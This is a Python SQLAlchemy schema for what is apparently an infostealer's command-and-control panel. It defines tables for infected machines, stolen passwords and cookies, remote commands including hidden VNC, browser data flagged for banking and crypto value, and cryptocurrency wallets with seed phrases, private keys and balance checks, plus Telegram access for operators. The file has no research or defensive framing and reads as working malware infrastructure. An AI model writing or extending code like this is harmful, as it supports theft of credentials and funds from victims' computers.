"""
Database models for RT-SRT logs and agents
"""

from datetime import datetime
from typing import Optional, List, Dict, Any
from sqlalchemy import (
    Column, Integer, String, Text, DateTime, Boolean, 
    ForeignKey, JSON, Index, Float
)
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import relationship, backref
from sqlalchemy.sql import func

Base = declarative_base()


class Agent(Base):
    """Agent model - represents a client/agent instance"""
    __tablename__ = "agents"
    
    id = Column(Integer, primary_key=True, index=True)
    agent_id = Column(String(64), unique=True, nullable=False, index=True)
    hostname = Column(String(255), nullable=False)
    ip_address = Column(String(45), nullable=False)  # Support IPv6
    os_info = Column(String(255))
    username = Column(String(255))
    
    # Status tracking
    first_seen = Column(DateTime, default=datetime.utcnow, nullable=False)
    last_seen = Column(DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    is_active = Column(Boolean, default=True)
    
    # Agent metadata
    version = Column(String(20))
    privileges = Column(String(50))  # admin, user, etc.
    architecture = Column(String(20))  # x86, x64, arm64
    
    # Geolocation (optional)
    country = Column(String(2))  # ISO country code
    city = Column(String(100))
    latitude = Column(Float)
    longitude = Column(Float)
    
    # Relationships
    logs = relationship("Log", back_populates="agent", cascade="all, delete-orphan")
    commands = relationship("Command", back_populates="agent", cascade="all, delete-orphan")
    
    # Indexes
    __table_args__ = (
        Index("idx_agent_active_lastseen", "is_active", "last_seen"),
        Index("idx_agent_ip_hostname", "ip_address", "hostname"),
    )
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            "id": self.id,
            "agent_id": self.agent_id,
            "hostname": self.hostname,
            "ip_address": self.ip_address,
            "os_info": self.os_info,
            "username": self.username,
            "first_seen": self.first_seen.isoformat() if self.first_seen else None,
            "last_seen": self.last_seen.isoformat() if self.last_seen else None,
            "is_active": self.is_active,
            "version": self.version,
            "privileges": self.privileges,
            "architecture": self.architecture,
            "country": self.country,
            "city": self.city,
        }


class Log(Base):
    """Log model - stores collected data from agents"""
    __tablename__ = "logs"
    
    id = Column(Integer, primary_key=True, index=True)
    agent_id = Column(Integer, ForeignKey("agents.id"), nullable=False)
    
    # Log metadata
    timestamp = Column(DateTime, default=datetime.utcnow, nullable=False, index=True)
    log_type = Column(String(50), nullable=False, index=True)  # passwords, cookies, etc.
    
    # Data storage
    data = Column(JSON, nullable=False)  # Structured data
    raw_data = Column(Text)  # Original encrypted data
    
    # File information
    file_path = Column(String(500))  # Path to stored file
    file_size = Column(Integer)  # Size in bytes
    file_hash = Column(String(64))  # SHA-256 hash
    
    # Processing status
    is_processed = Column(Boolean, default=False, index=True)
    is_encrypted = Column(Boolean, default=True)
    decryption_status = Column(String(20))  # success, failed, pending
    
    # Statistics
    items_count = Column(Integer, default=0)  # Number of items (passwords, cookies, etc.)
    
    # Relationships
    agent = relationship("Agent", back_populates="logs")
    
    # Indexes
    __table_args__ = (
        Index("idx_log_agent_timestamp", "agent_id", "timestamp"),
        Index("idx_log_type_processed", "log_type", "is_processed"),
    )
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            "id": self.id,
            "agent_id": self.agent_id,
            "timestamp": self.timestamp.isoformat() if self.timestamp else None,
            "log_type": self.log_type,
            "data": self.data,
            "file_size": self.file_size,
            "is_processed": self.is_processed,
            "is_encrypted": self.is_encrypted,
            "items_count": self.items_count,
        }


class Command(Base):
    """Command model - tracks commands sent to agents"""
    __tablename__ = "commands"
    
    id = Column(Integer, primary_key=True, index=True)
    agent_id = Column(Integer, ForeignKey("agents.id"), nullable=False)
    
    # Command details
    command_type = Column(String(50), nullable=False)  # hvnc, collect, update, etc.
    parameters = Column(JSON)  # Command parameters
    
    # Timestamps
    created_at = Column(DateTime, default=datetime.utcnow, nullable=False)
    sent_at = Column(DateTime)
    executed_at = Column(DateTime)
    
    # Status
    status = Column(String(20), default="pending", index=True)  # pending, sent, executed, failed
    result = Column(JSON)  # Command execution result
    error_message = Column(Text)
    
    # Relationships
    agent = relationship("Agent", back_populates="commands")
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            "id": self.id,
            "agent_id": self.agent_id,
            "command_type": self.command_type,
            "parameters": self.parameters,
            "created_at": self.created_at.isoformat() if self.created_at else None,
            "sent_at": self.sent_at.isoformat() if self.sent_at else None,
            "executed_at": self.executed_at.isoformat() if self.executed_at else None,
            "status": self.status,
            "result": self.result,
            "error_message": self.error_message,
        }


class User(Base):
    """User model - for web panel authentication"""
    __tablename__ = "users"
    
    id = Column(Integer, primary_key=True, index=True)
    username = Column(String(50), unique=True, nullable=False, index=True)
    email = Column(String(255), unique=True, nullable=False)
    password_hash = Column(String(255), nullable=False)
    
    # User details
    is_active = Column(Boolean, default=True)
    is_admin = Column(Boolean, default=False)
    created_at = Column(DateTime, default=datetime.utcnow)
    last_login = Column(DateTime)
    
    # API token
    api_token = Column(String(255), unique=True)
    api_token_expires = Column(DateTime)
    
    # Telegram integration
    telegram_user_id = Column(Integer, unique=True)
    telegram_username = Column(String(50))
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary (without sensitive data)"""
        return {
            "id": self.id,
            "username": self.username,
            "email": self.email,
            "is_active": self.is_active,
            "is_admin": self.is_admin,
            "created_at": self.created_at.isoformat() if self.created_at else None,
            "last_login": self.last_login.isoformat() if self.last_login else None,
            "telegram_username": self.telegram_username,
        }


# Additional models for specific data types
class BrowserData(Base):
    """Extracted browser data details"""
    __tablename__ = "browser_data"
    
    id = Column(Integer, primary_key=True, index=True)
    log_id = Column(Integer, ForeignKey("logs.id"), nullable=False)
    
    browser = Column(String(50), nullable=False)  # chrome, firefox, edge
    profile = Column(String(100))
    
    # Counts
    passwords_count = Column(Integer, default=0)
    cookies_count = Column(Integer, default=0)
    history_count = Column(Integer, default=0)
    autofill_count = Column(Integer, default=0)
    
    # Interesting findings
    has_banking = Column(Boolean, default=False)
    has_crypto = Column(Boolean, default=False)
    has_social_media = Column(Boolean, default=False)
    
    # Raw data reference
    data_hash = Column(String(64))  # For deduplication
    
    __table_args__ = (
        Index("idx_browser_data_log", "log_id"),
        Index("idx_browser_data_crypto_banking", "has_crypto", "has_banking"),
    )


class CryptoWallet(Base):
    """Extracted cryptocurrency wallet data"""
    __tablename__ = "crypto_wallets"
    
    id = Column(Integer, primary_key=True, index=True)
    log_id = Column(Integer, ForeignKey("logs.id"), nullable=False)
    
    wallet_type = Column(String(50), nullable=False)  # metamask, phantom, etc.
    address = Column(String(255))
    has_seed_phrase = Column(Boolean, default=False)
    has_private_key = Column(Boolean, default=False)
    
    # Additional metadata
    network = Column(String(50))  # ethereum, bsc, solana, etc.
    balance_checked = Column(Boolean, default=False)
    balance = Column(Float)
    
    __table_args__ = (
        Index("idx_crypto_wallet_type", "wallet_type"),
        Index("idx_crypto_wallet_valuable", "has_seed_phrase", "has_private_key"),
    )